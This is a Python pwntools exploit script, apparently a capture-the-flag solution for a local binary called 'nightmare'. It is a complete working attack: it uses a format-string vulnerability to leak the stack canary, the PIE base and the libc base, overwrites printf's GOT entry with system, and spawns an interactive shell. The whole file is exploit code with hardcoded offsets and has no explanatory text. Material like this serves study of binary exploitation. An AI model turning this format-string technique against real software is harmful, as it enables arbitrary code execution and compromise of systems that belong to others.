#!/usr/bin/python3

from pwn import *

def main():

	binary = './nightmare'
	elf = context.binary = ELF(binary, checksec = False)
	context.log_level = 'info'
	io = process(binary)

	#Stdin offsets - canary, pie, libc
	canary_leak_offset = 16 # %16$p
	pie_leak_offset = 24 # %24$p
	libc_leak_offset =  2 # %2$p
	input_offset = 5

	#RVA for libc and pie and printf
	libc_offset = 0xeee8e
	pie_base_offset = 0x2059 

	#Leaking libc,pie base and canary value 
	io.sendlineafter('> ', b'1')
	io.sendlineafter('>> ', b'%2$p %24$p %16$p')
	leaked_addresses = io.recv().split()

	#Getting canary value
	canary = leaked_addresses[2]
	canary = int(canary, 16)
	log.success(f'Leaked canary value: {hex(canary)}')

	#Calculating pie base address
	pie_base = leaked_addresses[1]
	pie_base = int(pie_base, 16)
	pie_base = pie_base - pie_base_offset
	log.success(f'Leaked pie base address: {hex(pie_base)}')

	#Calculating libc base address
	libc_base = leaked_addresses[0].strip(b'\n')
	libc_base = int(libc_base,16)
	libc_base = libc_base - libc_offset
	log.success(f'Leaked libc base address: {hex(libc_base)}')

	printf_address = pie_base + 0x3568
	system_address = libc_base + 0x048e50

	log.info(f'printf address: {hex(printf_address)}')
	log.info(f'system address: {hex(system_address)}')

	#Changing printf address to system address
	def send_payload(payload):

		io.sendline(b'1')
		io.sendlineafter('>> ', payload)
		log.info(f'Payload sent')
		return io.recv()

	format_string = FmtStr(execute_fmt=send_payload, offset = input_offset)
	format_string.write(printf_address, system_address) # write system address in printf address
	format_string.execute_writes()

	#Writing to system function the argument "sh" 
	io.sendline(b'2')
	io.recv()
	io.sendline(b'sh')

	#Shell
	io.interactive()

if __name__ == '__main__':
	main()


